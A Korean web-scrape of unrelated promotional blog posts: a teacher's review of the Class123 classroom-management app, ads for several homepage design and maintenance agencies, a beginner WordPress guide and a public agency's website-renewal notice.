광고기획, 마케팅, 간판제작www.mmcmso.com 기적컨설팅서울특별시 강남구 도산대로 176 대광빌딩 3층 기적컨설팅 ​ 20년간 학급담임을 하면서 매년 학급홈페이지나 카페 등 커뮤니티를 운영해왔습니다. 20년전 임용 첫해는 학교홈페이지와 학급홈페이지를 직접 만들어서 운영했으며 그후 블로그로 5년을 운영하고 10년 이상을 네이버 카페를 통해 학급 커뮤니티를 운영했습니다. 물론 요즘 클래스팅이나 밴드를 통한 학급관리도 몇년씩 시도했습니다. ​학교홈페이지를 활용한 학급커뮤니티 구성은 제법 쓸만하지만 학급자료가 매년 없어지는 것이 문제였습니다. 지속적으로 업데이트하여 활용할 수 있는 자료들이 사라져가는 아쉬움이 컸습니다. 학교홈페이지 관리가 잘안되는 학교의 경우 활성화 되기가 힘들기도 합니다. 네이버 블로그로 학생들의 사진과 알림장을 게시 블로그를 통한 학급 운영은 교사의 일방적인 전달로 사진 공유나 정보 공유는 잘되었지만 그다지 활성화 되지 않았습니다.  일반인도 많이 쓰는 그룹 채팅 및 메신저 겸 커뮤니티 앱 / 네이버 밴드 밴드를 통한 학급 커뮤니티는 소통 위주로 편리한 점이 있었지만 학급운영에는 큰 도움이 되지 않았습니다. 특히 학부모간의 갈등이 유발되는 점을 해결하기가 매우 힘들었습니다.  초등 메신저 및 그룹채팅 앱 / 클래스팅 학교 전용 메신저 클래스팅은 소통과 학급운영에 큰 도움을 받았지만 학부모들의 참여도가 달라 힘들었습니다.  학급관리 앱 클래스123을 선택한 이유클래스123은 원래 학생들의 학교생활을 돕기 위해 만들어진 앱입니다. 생활지도의 긍정적인 측면을 적극 활용하고 부정적인 측면을 최소화하여 학생들의 행동을 바르게 이끌어내는 기능을 최우선으로 생각한 기능성 앱입니다. 따라서 클래스123의 모든 활동이 학생들과 학부모의 공감을 얻어냅니다.  학급관리 앱으로 알려진 클래스123 / 커뮤니티 기능도 강력하다!  클래스 123의 장점- 학생의 개별화 교육 및 학급 커뮤니티 구성 가능학생 중심으로 학부모까지 확장되어 연계된 끈끈하며 교사의 사생활이 완벽하게 보호되는 학급커뮤니티 구성 / 학급정보를 적절하게 학부모와 학생 한번에 전달 가능 - 칭찬은 널리 알리고 충고는 확실히 전달하는 학급관리 앱커뮤니티 구성과 더불어 상담자료 및 수행평가 까지 연결된 데이터 적립으로 교사의 활동이 항상 보상이 있어 일반 메신저보다 효율적 효과적으로 사용  - 교사와 학부모의 부담이 없는 앱커뮤니티가 소통이 잘되면 교사의 부담과 갈등의 소지도 높아집니다. 클래스123는 교사의 사생활과 학부모의 관심정도가 적절히 조절됩니다. 학급전체가 사용할 수 있는 커뮤니티 게시판 기능, 1:1 메신저 기능, 통계 리포트 기능 등 교사 뿐만아니라 학부모까지 전화나 문자메세지를 쓸 필요를 못느낍니다.알림장 확인여부까지 개별로 확인이 가능한 점은 정말 교사에게 편리합니다.   클래스 123 학급 관리 기능 소개 학생별 긍정적 성장을 알아볼 수 있는 으쓱 머쓱시스템 머쓱의 경우 학부모 통보 여부를 결정할 수 있어 학생들의 바른 행동 유도에 긍정적이며 으쓱의 경우 학부모가 학교의 칭찬을 바로 알 수 있어 긍정적인 면이 큽니다.   다양한 방법으로 표시할 수 있는 학급 기능성 앱은 클래스 123이 유일합니다.  사진 명렬표 및 칭찬카드(으쓱) 상황판 자리 배치를 조절할 수 있는 학급상황판 학생 개별 상황 뿐만 아니라 반 전체를 통합하여 표시할 수 있는 학급온도계 학급에서 발표나 여러가지 상황에 활용할 수 있는 뽑기 기능 알림 타이머 제시 교사가 만들어내고 업데이트 할 수 있는 칭찬 쑥쑥 으쓱 카드 충고로 바른 행동을 이끌어내는 으쓱카드 학교 상황별로 교사 업데이트 가능 매일 부모님들께 알려야할 사항은 확실히 전달하고 부모님 확인여부를 항상 확인할 수 있어 편리한 알림장 학급의 여러가지 이야기 사진을 공유하고 학부모 학생 참여를 이끌어내는 커뮤니티 게시판 기능 중요한 정보를 저장해두고 볼 수 있는 커뮤니티 게시판 기능 클래스123의 가장 큰 강점인 통계 기능 / 수행평가 자료 활용 및 학부모 가정 발송도 가능함 필요한 경우 언제든 1:1 메세지가 가능하여 원할한 소통이 가능합니다.  날이 갈수록 학급운영에 있어 근거자료가 중요해지고 있습니다. 지금까지 정리해왔던 폐쇄적인 수행평가 보조부나 엑셀파일 등을 공개하는 효과로 학생들과 학부모들의 신뢰를 한번에 얻을 수 있는 학급관리 앱, 클래스123입니다.이런 신뢰를 바탕으로 학급소통을 이어갈 수 있는 아주 유용한 앱으로 추천합니다. 플레이스토어 클래스123 https://play.google.com/store/apps/details?id=com.class123.teacher&hl=en 선생님 Class123 (클래스123) - Google Play의 Android 앱칭찬으로 학생들을 변화시키는 무료 학급경영도구입니다. 아직 PC홈페이지에 방문하지 않으셨다면 꼭 PC에서 class123.ac를 방문해주세요.play.google.com ​비용을 들여 창업을 준비하고 시작한 창업자분들이 고민하시는 것이 바로 홈페이지 관리 일 것입니다. 홈페이지를 제작하고 난 후 상세페이지 제작 등 홈페이지 관리를 위해 홈페이지 관리 업체를 찾았지만 원활한 소통 하에 일을 잘하는 홈페이지 관리 업체를 만나기는 어려우셨겠죠. 수많은 창업자들 중 성공하는 창업자들의 경우 홈페이지를 잘 관리해 왔다는 공통점이 있을 겁니다. ​ ​제작해 놓은 홈페이지가 나의 서비스, 상품을 잘 알리고 있다고 생각하시나요? 브랜드 이미지에 맞는 마케팅이 제대로 되고 있다고 생각하시나요?홈페이지를 운영하시는 데 있어 지속적으로 브랜드 이미지에 맞게 유지 보수하고 상품에 대한 상세페이지를 제대로 제작하는 것은 구매를 유도하기 위해 정말 중요합니다. 상품, 서비스와 어울리지 않는 페이지를 제작하고 전체적인 홈페이지의 분위기와 어울리지 않고 동떨어진 상세페이지는 고객에게 신뢰를 주기 어렵겠죠. ​ ​여러분들의 상품, 서비스가 좋다고 하더라도 홈페이지 내에 이러한 내용이 제대로 구성되어 있지 않다면 소비자들은 이탈해 버리고 말겠죠. 그러한 중요한 곳이 바로 홈페이지입니다. 이에 일 잘하는 홈페이지 관리 업체를 찾아 홈페이지에 대한 유지 보수, 상세페이지 디자인 등을 의뢰해야 하는 이유겠죠. 서비스, 상품에 대한 상세페이지 제작은 꼼꼼히 진행되어야 경쟁 업체와는 차별화된 이미지로 어필할 수 있고, 소비자의 선택을 받을 수 있게 됩니다. 홈페이지는 사업을 진행하는 데 있어 브랜드, 서비스, 상품의 얼굴이 되는 곳이기 때문입니다. 이러한 홈페이지를 잘 제작하고 관리해야만 소비자의 신뢰를 얻고 구매율을 높일 수 있을 것입니다. ​ ​홈페이지 관리 업체 청년디자인은 여러분의 서비스, 상품에 대한 높은 이해도를 바탕으로 디자인 작업을 진행합니다. 청년 디자인에서는 알찬 경력과 노하우를 가지고 있는 디자이너가 창업자분들과의 원활한 소통 하에 진행해야 하는 디자인에 대해 구상하고 작업을 진행합니다. 1인 창업을 준비하시는 분들, 매출 증가를 희망하는 사장님, 피드백이 너무 느린 디자인 회사 때문에 답답했던 고객분들도 믿고 맡길 수 있는 홈페이지 관리 업체를 찾는다면 청년디자인을 선택하시는 것이 좋겠죠. ​ NO!너무나도 느린 피드백터무니없는 가격지켜지지 않는 약속청년 디자인에서는 이러한 문제를 해결하겠습니다! ​ ​청년디자인은 식품, 의류, 미용, 화장품, 반려동물 관련 제품과 서비스, 유아 관련 상품, 여행 상품 등 수많은 분야의 서비스와 상품을 소개하는 상세페이지 디자인을 통해 매출을 상승시켜드리는 홈페이지 관리 업체입니다. 각각의 상품, 서비스의 분야에 대해 명확히 이해하고 이러한 이해도를 바탕으로 홈페이지를 관리하는 데 있어 어떠한 방향성으로 나아가야 하는지, 디자인을 각 분야에 적합하게 하기 위해서는 어떻게 해야 하는지 전문성과 노하우를 갖춘 디자이너가 꼼꼼히 작업을 진행합니다. 저작권에 문제가 되지 않는 이미지, 폰트를 이용해 디자인을 진행하기 때문에 이러한 부분에서 문제가 생겨 골치가 아프셨던 분들에게도 걱정을 해소해 드립니다. ​ ​청년디자인은 의뢰를 주실 경우 원하시는 작업에 대해 꼼꼼히 담당자와 상담을 진행해 디자인을 진행하는 데 있어 필요한 정보, 자료를 전달받고 이를 체크하여 준비합니다. 이후 디자인 초안을 제작해 고객님의 요청이 잘 반영되었는지 확인하고 수정 사항을 적용해 완료된 작업물을 세팅하고 전달합니다. 이러한 일련의 과정들이 바로 창업자분들의 사업을 더욱 번창하게 할 수 있는 과정들입니다. 청년 디자인에서는 약속을 중요시 여기며 홈페이지 관리, 디자인 작업을 위해 창업자분들과 소통하고 응답하며 작업을 진행합니다. ​ ​이러한 일련의 과정들이 창업자분들이 원하는 매출 상승을 위해 꼭 필요한 과정들이기 때문에 청년디자인은 약속을 지켜나가고 있습니다. 원활한 소통이 되지 않아 답답한 업체, 비용이 너무 비싸기만 한 업체, 약속을 지키지 않는 업체와의 문제로 머리가 아프셨던 창업자분들을 위해 탄생한 곳이 바로 청년디자인입니다. 이러한 문제점을 개선하고 올바른 디자인 회사를 만들겠다는 신념하에 회사를 만들고 서비스를 제공하고 있는 업체가 바로 청년디자인입니다. ​ ​청년 디자인에서는 1인 창업자분들을 위한 스마트 스토어 제작, 상세페이지 제작, 카드 뉴스(SNS) 제작, 홈페이지형 블로그 제작 등의 서비스를 제공하고 있습니다. 상품을 판매하는 데 있어 창업자분들이 쉽게 접근이 가능해 자주 애용하는 스마트 스토어의 제작부터 판매 상품에 대한 꼼꼼한 이해와 디자인이 적용되어야 매출 상승을 이룰 수 있는 상세페이지 제작, 최근 다양한 사업가들이 마케팅에 활용하며 정말 중요해지고 있는  SNS 마케팅을 위한 카드 뉴스 제작, 홈페이지와 블로그의 장점을 두루 갖춰 부담 없이 시작이 가능한 홈페이지형 블로그 제작까지!청년 디자인에서는 소상공인, 영세 상인, 청년창업자분들을 응원하고자 노력하고 있습니다. ​ ​청년디자인은 사람, 약속, 변화라는 비전 하에 고객분들을 위해 일하는 업체입니다. ​좋은 경험과 마인드를 토대로 하는 사람이 기업을 이루고 고객분들과의 약속을 중요시하며 작업을 진행하며변화가 필요할 때에는 그에 적응해 나가며 변화를 이루어 온 여러분에게 꼭 필요한 홈페이지 관리 업체입니다. ​다양한 서비스에 대한 상담 꼼꼼히 진행하고 있는 청년디자인과 소통하고 싶으시다면 언제든지 아래 번호로 문의하시기 바랍니다.  전화 문의1668-2016​ ​ 안녕하세요 워드프레스 웹사이트를 운영하고 있는 방방이 입니다. 저는 개인적으로 경기도에서 회사를 운영하고 있으며 내 회사의 홈페이지를 만들기 위해 4년 정도 워드프레스 홈페이지 제작과 관리에 관해 공부해온 초보자 워드프레스 운영인입니다. 제가 블로그를 통해 워드프레스 이야기를 지속적으로 전달하는 이유는 많은 분들이 관심은 있지만 쉽게 다가서지 못하는 웹사이트 제작 부분은 초보자 여러분께 알려드리기 위해서라고 생각해 주시면서 오늘 소개하는 내용을 확인 바랍니다.​ 초보자를 위한 워드프레스 홈페이지 제작 가이드 우선 워드프레스에 관심은 있지만 어떻게 시작해야 할지부터 난감한 완전 초보자를 위한 포스팅임을 감안하고 구독하시기 바랍니다. 맨 처음 제가 워드프레스를 시작할 때 가장 힘들었던 부분은 시작 단계인 호스팅 이였습니다. 도메인을 만드는 것부터 버벅 거렸던 시절이며 이후 카페24라는 호스팅 웹사이트에 가입하고 일반형으로 가입해서 워드프레스를 처음으로 시작하게 되었는데 지금 생각해보면 아무것도 아닌 일이 왜 그렇게 어려웠는지 모르겠습니다.​호스팅 시작하기 호스팅이란 도메인 생성과 서버 등록 과정이라 할 수 있는데요 초보자가 쉽게 이 과정을 통과하는 방법은 국내 업체보다 해외 워드프레스 전용 호스팅 업체를 이용하시기 추천합니다. 제가 추천하는 업체의 이름은 "사이트그라운드"입니다. 이곳은 블루호스트라는 곳과 함께 가장 인기 있는 해외 호스팅 업체이며 특히 워드프레스를 호스팅하고 설치하는 과정까지 불과 10분이내 가능하니 워드프레스 홈페이지 제작에서 가장 첫 번째 단계를 통과하는 방법으로는 최선이라 할 수 있습니다.​사이트 그라운드 이용으로 호스팅 완성하기 참조​워드프레스 셋팅하기 호스팅이 완료되는 순간 여러분 앞에 놓여진 워드프레스 관리자 페이지를 셋팅해야 하는 것이 바로 실제 코딩 과정을 시작하는 단계라 할 수 있습니다. 셋팅이란 워드프레스 홈페이지 제작을 위해 관리자가 사용하는 방법을 변경하는 것인데요 예를들어 사이트 언어를 한국어로 만들고 운영 시간대를 국내 시간으로 변경할 수 있으며, 포스팅이나 페이지를 발행하게 되면 url 주소를 한국어로 나타나게 할 수도 있습니다. 이 모든 과정을 셋팅 구간이라 부르며 이 셋팅이 완료되야 비로서 페이지를 만들고 첫 번째 컨텐츠를 발행할 수 있게 됩니다.​워드프레스 설치 후 기본 설정 하는 방법 참조​워드프레스 홈페이지 제작을 위한 테마와 플러그인 활용 웹사이트를 만들기 위해서 과거 프로그래머는 기본적으로 코딩 언어를 알아야 했습니다. 하지만 워드프레스는 테마와 플러그인을 활용해서 코딩을 몰라도 홈페이지를 디자인 할 수 있고 컨텐츠를 생성하고 관리할 수 있도록 하고 있습니다. 특히 테마와 플러그인을 잘 구성할 수 있다면 html 이나 css와 같은 프로그램 언어를 몰라도 훨씬 더 퀄리티 있는 웹사이트를 완성할 수 있다는 것이 워드프레스를 이용해 초보자가 홈페이지를 만들 때 가장 큰 매력이라고 저는 개인적으로 생각합니다.​테마와 플러그인에 대한 세부적인 정보들의 경우 너무 광범위 하기 때문에 이 시간에 다루기는 어려워 앞으로 방방이가 꾸준하게 인기 테마와 플러그인을 소개하고 사용 방법등을 안내해 드리도록 하겠습니다.​페이지 만들기 및 포스팅 발행하기 워드프레스 준비 과정이 끝났다면 본격적으로 페이지를 생성하고 포스팅을 발행하기 시작하는데요 페이지를 만들 때 주의할 부분은 seo 관리입니다. seo란 검색엔진최적화를 뜻하는데 포털이 좋아하는 방식으로 페이지를 구성할 수 있어야 추후 사이트를 지속적으로 관리할 때 여러분의 컨텐츠가 포털에 노출되는 확률이 올라갑니다.​페이지 생성 시 seo에 관련한 정보의 경우 많은 글들이 있지만 제가 추천한는 방법은 바로 yoast 플러그인 가이드를 통해 페이지를 만드는 것입니다. yoast 플러그인은 페이지 생성이나 포스팅 발행 시 검색엔진 최적화에 도움이 되는 정보를 제공하는데 대표적인 것이 타이틀 설정 방법과 키워드 등록을 통한 최적화 입니다.​포스팅도 이와 마찬가지 방법을 통해 발행하는 것이 유리하고 포스팅은 레이아웃 설정에 따라 전체적인 웹사이트 이미지에 영향을 주게 되닌 처음 템플릿을 만들 때 신중해야 할 필요가 있습니다.​페이지 생성과 포스팅 가이드 포스팅은 아직 준비되지 않아 최대한 빠르게 소개한 내용들의 세부적인 적용 방법을 전달해 드리도록 하겠습니다.​자 여기까지가 소위 코딩이라 말하는 워드프레스 초보 단계입니다. 물론 페이지 생성 후 홈페이지와 일반 페이지를 구분하고 글 페이지를 분류하는 등 세부적인 내용들이 더 많지만 사실 코딩이란게 알고보면 어렵지 않다는 것을 이해하는데 도움을 드리는 정보인만큼 깊은 내용들은 삭제 하였습니다. ​ 초보자를 위한 워드프레스 홈페이지 관리 가이드 워드프레스를 관리한다는 것은 어떤 의미일까요? 바로 디자인 적인 측면부터 seo 적인 내용까지 지속적으로 웹을 업데이트하고 꾸준하게 정보를 제공하는 것을 말합니다. 워드프레스로 만들어진 웹사이트는 여러분의 노력 여하에 따라 얼마든지 전문가보다 잘 관리할 수 있는 것이 최고의 매력인데 이 부분을 간과하고 그냥 평범한 홈페이지로 버려져 있는 많은 웹사이트를 보면 참 안타까울 따름입니다.​만약 당신이 기업이나 사업장 홈보를 위해 워드프레스 홈페이지를 운영하려고 한다면 앞으로 방방이 블로그에 자주 방문하셔서 필자의 포스팅을 참고하시는 것도 도움이 될 것이라 확신합니다.​워드프레스 홈페이지 및 페이지 디자인 관리 메인 페이지와 일반 페이지가 너문 따로 노는 웹사이트를 종종 볼 수 있습니다. 혹은 홈페이지는 그럴싸 하지만 다른 페이지의 경우 거의 정보가 없거나 형식적인 내용만으로 꾸며진 경우 이용자는 홈페이지 잠깐 보고 이내 웹을 떠나게 됩니다. 디자인적인 측면에서 볼 때 모든 홈페이지는 깔끔하면서 전달하려는 정보를 한 눈에 확인되도록 꾸미는 것이 핵심입니다.​또한 디자인 컨셉을 결정하기 위해서는 많은 웹사이트 디자인을 관심 깊게 확인하고 자신의 역량으로 가능한 요소들을 적용하는 방식으로 워드프레스 홈페이지 디자인을 만들어 가는 것을 추천합니다. 즉 초보자의 경우 많이 보고, 따라하는 것으로 점차 퀄리티 있는 홈페이지 디자인이 완성된다는 것입니다.​테마와 플러그인이 가진 요소들을 활용해서 컨텐츠를 만들어내는 능력을 향상시키는 작업은 어느정도 시간이 필요하지만 포기하지 않고 꾸준하게 워드프레스와 함께하는 동안 자신도 모르는 사이에 당신의 웹사이트는 훌륭한 홈페이지를 가지게 된다는 것을 필자가 경험 상 터득하고 있는 가장 큰 노하우라 할 수 있습니다.​워드프레스 웹 노출을 위한 seo 관리와 주의 사항 워드프레스 관리라는 것은 seo에 유리한 컨텐츠 발행이 주요 요소입니다. 즉 포스팅을 발행하는 방법과 홈페이지를 seo에 맞게 만드는 것이라 할 수 있습니다. 네이버와 구글 등 포털에 여러분의 워드프레스 웹사이트가 상위에 노출되기 바란다면 검색엔진 최적화를 위한 관리가 필요하고 사이트 랭크 향상을 위한 꾸준한 노력이 필요합니다.​워드프레스 관리에서 가장 중요한 검색엔진 최적화를 결정하는 가장 중요한 핵심은 역시 꾸준한 컨텐츠 발행이며 컨텐츠 로직인 포털 크롤러가 원하는 방식으로 만들어지는 것이 좋을 것입니다.​마지막으로 워드프레스 관리에서 주의해야 할 부분을 전해드리고 워드프레스 홈페이지 제작과 관리 방법에 관한 이야기를 마치도록 하겠습니다. 우리가 워드프레스를 사용하면서 자주하는 실수는 복제된 컨텐츠를 사용해서 컨텐츠를 쉽게 제작하고 꾸준한 관리가 확인되지 않는 웹사이트 입니다.​워드프레스는 웹사이트 목적에 따라 어떤 컨텐츠도 제작할 수 있는 프로그램으로 이용자의 노력에 따라 자연적으로 검색엔진 최적화가 될 수 있도록 만들어진 시스템입니다. 그렇기에 중간에 포기하지 말고 꾸준하게 컨텐츠를 발행한다면 머지않은 시간에 여러분이 제작한 홈페이지는 관련 키워드 1면을 장식하게 될 것입니다. 안녕하세요~오늘도 낮에 후덥지근한게 벌써부터 초여름날씨같아요와 6월인데 5월이랑은 또다른날씨~ 1일부터 여름을 연상케 하는 날씨네요.  아직은 일교차 심한 변덕같은 날씨에 감기조심하세요 다들~코로나로 인한 삶이 많이변했지만 그삶에또 적응하고 있는 중이네요..​이렇게 날씨좋으면 꼭 놀러가곤 했는데 요즘에는 한번더 참아야하니 마스크 착용하며 생활하는 어린 아이들도 불쌍하고 어른들도 넘 힘든시기죠​그래도 모두들 파이팅 하시고 올여름 지나서는 자유롭게 지낼수 있길 바라봅니다.​  안녕하세요 블로그제작 블로그관리 홈페이지제작까지!온라인마케팅 전문가 hemall을 소개해드리려고 해요.  얼마전, 저희 고객님으로부터 장문의 감사 문자를 받았는데요.은퇴 후, 새로 시작하신 일이난관에 부딪힐 때마다 참 막막하셨다고.그러나 아직 부양해야 할 가족들이 있으니쉽게 포기는 할 수 없었는데그러던 중 저희 hemall을 만나 꾸준한 매출을 올리게 되었다고감사한다는 내용이었습니다.  저희야 늘 하던 일을 해왔을 뿐인데이렇게 연락을 주시는 분들을 보면서 저희가 더욱 힘을 받고 일을 할 수 있게 되는 것 같아요.그래서 오늘도 더욱 고객님들의 매출을 위해 열심히 노력하겠습니다. 저희 hemall은 여러 가지 방법으로 온라인마케팅을 진행하고 있습니다.첫 번째로는 각종 홈페이지제작, 블로그제작 그리고 블로그관리 인데요.많은 분이 온라인마케팅이 진행되어야 한다는 건 아시지만여건이 되지 않으셔서 저희가 이 부분을 도와드리고 있습니다. 먼저 블로그와 홈페이지를 개설하기 위해서는 홍보하는 제품이 무엇인지 정확하게 알아야 합니다. 따라서 직접 저희가 제품을 보러 가기도 하고고객님과의 충분한 회의를 진행하기도 하는데요.주로 고객님께서 중점적으로 알리고 싶은 것이 무엇인지를 파악합니다.그리고 어떤 이미지를 두고 나가게 될지결정하게 됩니다.  다음으로 중요한 것은 바로 홈페이지제작, 블로그제작, 블로그관리 인데요.개설만 했다고 해서 모든 사람이 알아서 제품 혹은 서비스를 보러 오지는 않습니다.따라서 지속적인 관리로 네이버나 다음 등의 검색사이트의 상위에 노출되는 것이 중요합니다.   검색사이트들이 콘텐츠를 상위에 올리는 기준은여러 가지가 있지만 그중에서도 계속된 포스팅이 가장 중요한데요.저급의 포스팅이 아닌 동영상과 이미지 등을 활용한 양질의 콘텐츠 생산이 필요합니다.  따라서 저희 hemall은 요즘 유행하는 유튜브 동영상은 물론 자체적으로 다양한 이미지와 로고를 제작하여 온라인에 있는 수많은 잠재고객에게 제품을 홍보하게 됩니다. 또한, 홈페이지제작, 블로그제작과 블로그관리 외에도 파워링크, 클릭초이스 등으로불리는 블로그 광고도 진행하고 있는데요.  이 서비스들은 온라인에 있는 고객들이 검색 시 제일 많이 클릭하게 되는 부분입니다.주로 제목과 설명 문구, 사이트 URL이 함께 노출되며 시각적으로 눈에 띄는 부분이 크기에 홍보 효과도 넓다고 할 수 있습니다.  이러한 서비스들의 장점은 로그 분석을 통해 철저한 데이터 분석이 가능하다는 점인데요. 클릭하는 고객들의 접속 수는 얼마인지 파악할 수 있으며인기 있는 노출 검색어에 대한 정보를 알 수 있어온라인마케팅을 진행할 시 많은 이득을 얻을 수 있습니다.  따라서 전문적인 광고가 가능하기에 많은 분이 이용하는 서비스입니다. 저희 hemall은 이 외에도 네이버 카페나 다음카페를 운영하여 고객님이 매출을 올릴 수 있도록 도와드리고 있는데요.저희와 실시간으로 상담이 가능하니매출을 올리고 싶으신 분!지속적인 온라인마케팅을 원하시는 분들은 저희 hemall과 바로 상담을 진행하세요. 이제 꾸준한 매출을 올리는 방법은 전문적인 온라인마케터와 함께하는 것입니다.저희 hemall과 함께하면 쉽고 간편하게 광고효과를 내실 수 있으니주저 말고 연락해주세요.이제 성공은 고객님의 것입니다.  #블로그제작 #블로그관리 #홈페이지제작       신속한 서비스 빠른홈페이지제작관리센터 빠른홈페이지제작관리센터홈페이지 전문 제작 관리 업체, 반응형 홈페이지 솔루션 제작 상담 및 접수easy.speed365.co.kr ​홈페이지제작'했던' 업체못 찾고 계신가요?​빠른홈페이지제작관리센터에 문의해보세요.  어떤 상황이시더라도신속한 해결책을 제시해 드립니다.  Since 2005  웹호스팅 서비스에서홈페이지유지보수서비스까지어떤 어려움이 있으시다면지금 전화주세요.1644-9365  ​수정내용을 '먼저' 보내셔도 됩니다^^​이메일 접수 : master@speed365.co.kr​카톡채널로도 상담 가능합니다. 카카오톡 상담이지홈페이지카카오톡 채팅을 해보세요.pf.kakao.com ​​​#온라인 #마케팅 #인터넷홈페이지 #제작업체 #맞춤형 #홈페이지제작 #모바일 #페이지제작 #웹 #유지 #관리 #쇼핑몰 #홈페이지 제작 #웹 #호스팅 #온라인 #쇼핑몰 #웹관리 #도메인이전 #반응형 #홈페이지 #업그레이드 #빠른수정 #웹페이지빠른수정 #홈페이지게시판추가 #홈페이지관리대행 #홈페이지유지관리업체#홈페이지유지보수업체 #홈페이지이전 #홈페이지제작업체 찾기 #홈페이지코딩대행 #광고대행사 공단 홈페이지가 전면 리뉴얼되어새로운 모습으로 고객님들을 찾아갑니다. ​사용자 중심으로 접근성과 편의성이 강화되고 다양한 기기와 웹 환경에서도 안정적인 서비스를 제공하기 위하여반응형 웹 디자인을 적용하였다고 하는데요~!​이와 관련된 자세한 내용은 아래 내용을 참조하여 주세요.​  의정부시시설관리공단(이사장 임해명)이 사용자 중심의 정보 접근성과 편의성을 강화하기 위해 대표 홈페이지를 전면 리뉴얼하고 새롭게 오픈했다. ​모바일 중심의 IT환경 변화에 대응하고 다양한 기기(PC, 태블릿, 스마트폰 등) 및 웹 환경에서도 동등한 서비스를 제공하고자 반응현 웹디자인을 적용하였으며, 보다 안정적인 서비스를 제공하고자 한다.​공단은 기존의 홈페이지를 문화·체육시설, 교통·환경시설, 복지·편의시설로 분류하여 모바일 환경에서도 편리하게 접속 가능하도록 구성하였으며, 2021년 하반기에는 모바일 예약결제사이트를 구축하여 사용자 중심의 모바일 서비스를 제공할 예정이다.​임해명 이사장은 "공단을 이용하는 고객에게 유용한 정보를 보다 쉽게 접근할 수 있도록 홈페이지 개선에 최선을 다하고 이용자 만족도 향상을 위해 지속적으로 노력하겠다"고 밝혔다.    언제나 고객의 편의를 위해 지속적으로 노력하는 의정부시시설관리공단이 되겠습니다. ​​​ ​​​​​안녕하세요 비전테크입니다!​홈페이지를 개설이나 리뉴얼을 위해 제작업체를 알아보고 계신가요?수 많은 업체 중에 어떤 곳을 골라야할지고민이신 분들 많으실텐데요!​​​​​​ ​​​​​오늘은 홈페이지 운영관리 방법에 대해 알아보려고 하는데요.​홈페이지개설에 있어서 따져봐야 할 점은 무엇이 있을까요?​​​​​​ ​​​​​첫번 째는 디자인입니다.​빠르게 변해가는 트렌드에 맞게 디자인도 바껴가야 겠죠?홈페이지는 해당 기업을 알아보기 위해서가장 먼저 보여지는 얼굴이라고 할 수 있습니다.막상 들어가서 보니 오래전에 업데이트를 했다거나아직 공식사이트가 만들어지지 않았다면기업을 알아보는 사람이나 소비자에게높은 신뢰도를 얻기는 힘들겠죠..?!​​​​​​​ ​​​​​두번 째는  레이아웃입니다.​홈페이지를 클릭했을 때,'아 이 기업은 어떤 기업'이구나 한 눈에 알아 볼 수 있어야겠죠.또한 그 안에 소비자가 보고싶은 핵심적인 정보가담겨있어야 합니다.한 마디로 보기좋은 홈페이지를 구축하는 것이 중요하죠.​​​​​ ​​​​​많은 홈페이지 운영관리 업체가 있지만생각보다 만족하지 못하는 분들도 많고,어떤 곳을 골라야하는지기준점 조차 갖지 못하는 분들도 많습니다.​​​​​ ​​​​​​저희 비전테크는 홈페이지 구축에 갈피를 잡지 못하는 분들,오래된 홈페이지를 리뉴얼 하고싶으신 분들,운영관리는 어떻게 해야하는지 고민이신 분들을위해 상담도 진행해 드리고 있습니다.​​​​​​ ​​​​​​아래 홈페이지나 연락처를 통해 상담문의를 주시면24시간안에 답변을 드리고있습니다.  자세한 내용은 홈페이지를 참고해주세요!​​​​​​​ ​​ 홈페이지 관리 즉, 홈페이지유지보수 업체인 지오니드(www.zionid.co.kr 대표 이은경)의 홈페이지유지보수 수행 실적 정리 SK VoIP C/S 사이트 유지보수삼성의료원 Pal짱 유지보수삼성몰 기프트샵 유지보수SK텔레시스 전략사이트 유지보수대한주택공사 파주운정신도시 유지보수대한민국육군 공식 블로그 유지보수두산건설 대표 사이트 유지보수두산위브 브랜드 사이트 유지보수두산위브센티움 유지보수두산제니스타워 유지보수두산위브 프로젝트 사이트 유지보수한국도자기 쇼핑몰 한국닷컴 유지보수한국도자기 커뮤니티 조이한국 유지보수한국도자기 그룹 사이트 유지보수두산중공업 브랜드 사이트 유지보수인터파크 몰인몰 유지보수신세계몰 몰인몰유지보수KTF 드라마 몰인몰 유지보수한솔CSCLUB 몰인몰 유지보수우리홈쇼핑 몰인몰 유지보수Miclub.com 쇼핑몰 유지보수두산위브 상수 유지보수두산위브 온라인 매거진 유지보수두산위브 온라인 사보 유지보수두산위브 패밀리닷컴 유지보수두산건설 CRM 유지보수두산위브 재개발재건축 유지보수스타벅스 프로모션 사이트 유지보수두산중공업 분양 사이트 유지보수해태전자 쇼핑몰 유지보수두산위브 대표 사이트 유지보수라마다서울 호텔 유지보수베스트웨스턴 호텔 유지보수미란다호텔 유지보수이천스파플러스 유지보수NGTV 디자인 유지보수광동생활건강 디자인 유지보수도민상호저축은행 유지보수한국도자기 쇼핑몰 유지보수한국도자기 커뮤니티 유지보수한국도자기 본사사이트 유지보수  홈페이지관리 WCMS로 간편하게!  홈페이지관리 - 10억홈피  WCMS 안녕하세요디지털마케팅컴퍼니 10억홈피입니다~!!그동안 홈페이지관리 하면서 불편하셨던게 한두가지가 아니었죠? 간단한 수정임에도 불구하고 일일히 업체에 연락해야하는 불편함을 겪고 계신다면?   홈페이지관리 - 10억홈피  WCMS 막연히 어렵게만 느껴지는 홈페이지관리!누구나 쉽게 관리할 수 있는 관리 프로그램이 있다면 어떨까요?   홈페이지관리 - 10억홈피  WCMS 10억홈피에서는 홈페이지제작을 의뢰하게 되면 전문가가 아니라도 누구나쉽고 빠르게 이용할 수 있는 사이트 관리 프로그램을기본으로 제공해드린다는 사실!   홈페이지관리 - 10억홈피  WCMS 프로그래밍 언어적 지식이 없어도 누구나 쉽고 편하게 관리할 수 있는 WCMS! (Web Content Management System)   홈페이지관리 - 10억홈피  WCMS WCMS는 단순한 홈페이지 관리 프로그램이아닌 효율적인 마케팅 전략수립과 홍보전략을세울 수 있는 프로그램인데요!어떤 키워드로 가입했는지부터 가입 경로까지 상세한 방문자 분석이 가능합니다!   홈페이지관리 - 10억홈피  WCMS 사이트 내에서도 쉽게 카테고리를생성, 삭제 등 자유롭게 수정이 가능하며카테고리별로 방문자수가 누적되어 통계를 통해 방문자의 관심도를 측정해볼 수 있습니다!마케팅 분석에 도움이 되겠죠?   홈페이지관리 - 10억홈피  WCMS 전체상품 뿐만 아니라 특정 카테고리,특정 상품에 한하여 온라인 할인쿠폰 또한 발행이 가능한데요! 오프라인 활동을 위한쿠폰 발행도 할 수 있어 이벤트로 활용하거나충성고객 확보에도 도움이 되는 기능입니다!   홈페이지관리 - 10억홈피  WCMS WCMS의 SMS모듈은개별/그룹/예약발송기능과 메세지저장기능까지 갖춰 소비자들에게 전화나 팩스 등 다른 